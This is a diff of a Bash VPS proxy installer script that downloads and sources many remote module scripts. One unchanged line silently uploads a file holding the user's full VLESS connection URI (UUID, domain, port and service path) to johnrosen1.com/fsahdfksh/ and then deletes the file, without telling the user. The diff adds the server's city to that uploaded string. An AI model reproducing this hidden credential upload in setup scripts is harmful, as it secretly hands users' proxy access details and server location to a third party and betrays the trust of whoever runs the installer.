@@ -185,7 +185,7 @@ prasejson
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(grpc_${mycountry}_${myip})" &> ${myip}.txt
+echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${mycountry}_${mycity}_${myip})" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
@@ -196,7 +196,7 @@ if [[ ${install_dnscrypt} == 1 ]]; then
     systemctl disable systemd-resolved
   fi
 if [[ $(systemctl is-active dnsmasq) == active ]]; then
-    systemctl stop dnsmasq
+    systemctl disable dnsmasq
 fi
 echo "nameserver 127.0.0.1" > /etc/resolv.conf
 systemctl restart dnscrypt-proxy
@@ -272,6 +272,7 @@ fi
 curl --retry 5 -s https://ipinfo.io?token=56c375418c62c9 --connect-timeout 300 > /root/.trojan/ip.json
 myip="$( jq -r '.ip' "/root/.trojan/ip.json" )"
 mycountry="$( jq -r '.country' "/root/.trojan/ip.json" )"
+mycity="$( jq -r '.city' "/root/.trojan/ip.json" )"
 localip=$(ip -4 a | grep inet | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
 myipv6=$(ip -6 a | grep inet6 | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
 }
@@ -290,45 +291,37 @@ clear
 ## 安装具体软件
 install_moudles(){
   # Src url : https://github.com/johnrosen1/vpstoolbox/blob/master/install/
-  ## Install bbr
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/bbr.sh
   source bbr.sh
   install_bbr
-  ## Install Docker
   if [[ ${install_docker} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/docker.sh
   source docker.sh
   install_docker
   fi
-  ## Install PHP
   if [[ ${install_php} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/php.sh
   source php.sh
   install_php
   fi
-  ## Install Nodejs
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nodejs.sh
   source nodejs.sh
   install_nodejs
-  ## Install Mariadb
   if [[ ${install_mariadb} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/mariadb.sh
   source mariadb.sh
   install_mariadb
   fi
-  ## Install Redis
   if [[ ${install_redis} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/redis.sh
   source redis.sh
   install_redis
   fi
-  ## Install mongodb
   if [[ ${install_mongodb} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/mongodb.sh
   source mongodb.sh
   install_mongodb
   fi
-  ## Install Hexo
   if [[ ${install_grpc} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/grpc.sh
   source grpc.sh
@@ -364,11 +357,6 @@ install_moudles(){
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/sonarr.sh
   source sonarr.sh
   install_sonarr
-  fi
-  if [[ ${install_dnscrypt} == 1 ]]; then
-  curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/dnscrypt.sh
-  source dnscrypt.sh
-  install_dnscrypt
   fi
   if [[ ${install_fail2ban} == 1 ]]; then
   curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/fail2ban.sh
